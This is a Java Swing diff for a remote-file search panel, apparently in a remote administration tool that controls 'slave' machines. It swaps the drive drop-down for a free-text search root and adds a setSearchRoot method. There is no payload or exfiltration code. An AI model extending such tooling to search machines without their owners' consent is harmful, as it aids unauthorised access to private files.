@@ -37,7 +37,7 @@ public class PanelSearchFiles extends PanelControlParent {
 	private TableModel model;
 	private JTextField txt;
 	private final ButtonGroup buttonGroup = new ButtonGroup();
-	private JComboBox<String> cbDrives;
+	private JTextField cbDrives;
 	private FileSearchTableRenderer renderer;
 	private FrameRemoteFiles parent;
 
@@ -85,12 +85,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		});
 		btnClear.setIcon(IconUtils.getIcon("clear"));
 
-		cbDrives = new JComboBox<String>();
-		cbDrives.setRenderer(getDrivesRenderer());
-
-		for (Drive drive : slave.getDrives()) {
-			cbDrives.addItem(drive.getName());
-		}
+		cbDrives = new JTextField(slave.getDrives()[0].getName());
 
 		table = new DefaultJTable();
 		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Path", "Name" }));
@@ -118,7 +113,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		table.setRowHeight(30);
 		scrollPane.setViewportView(table);
 
-		JLabel lblDrive = new JLabel("Drive");
+		JLabel lblSearchRoot = new JLabel("Search from");
 
 		JButton btnOpenInFile = new JButton("Open");
 		btnOpenInFile.addActionListener(new ActionListener() {
@@ -156,7 +151,7 @@ public class PanelSearchFiles extends PanelControlParent {
 					.addGap(2))
 				.addGroup(Alignment.TRAILING, groupLayout.createSequentialGroup()
 					.addGap(135)
-					.addComponent(lblDrive)
+					.addComponent(lblSearchRoot)
 					.addPreferredGap(ComponentPlacement.RELATED)
 					.addComponent(cbDrives, GroupLayout.PREFERRED_SIZE, 87, GroupLayout.PREFERRED_SIZE)
 					.addGap(10)
@@ -183,7 +178,7 @@ public class PanelSearchFiles extends PanelControlParent {
 						.addComponent(txt, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
 						.addComponent(lblSearchFor)
 						.addComponent(cbDrives, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-						.addComponent(lblDrive))
+						.addComponent(lblSearchRoot))
 					.addContainerGap())
 		);
 		setLayout(groupLayout);
@@ -193,7 +188,7 @@ public class PanelSearchFiles extends PanelControlParent {
 				JButton src = (JButton) arg0.getSource();
 				if (src.getText().equals("Search")) {
 					src.setText("Stop...");
-					sl.addToSendQueue(new Packet53StartSearch(cbDrives.getSelectedItem().toString(), txt.getText(), tglbtnPathContains.isSelected()));
+					sl.addToSendQueue(new Packet53StartSearch(cbDrives.getText(), txt.getText(), tglbtnPathContains.isSelected()));
 				} else if (src.getText().equals("Stop...")) {
 					src.setText("Search");
 					sl.addToSendQueue(new Packet54StopSearch());
@@ -203,13 +198,10 @@ public class PanelSearchFiles extends PanelControlParent {
 		});
 	}
 
-	public DefaultListCellRenderer getDrivesRenderer() {
-		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
-
-		for (Drive drive : slave.getDrives()) {
-			renderer.addIcon(drive.getName(), IconUtils.getIcon("drive"));
-		}
-
-		return renderer;
+	/**
+	 * Start file search from this path
+	 */
+	public void setSearchRoot(String searchRoot) {
+		cbDrives.setText(searchRoot);
 	}
 }
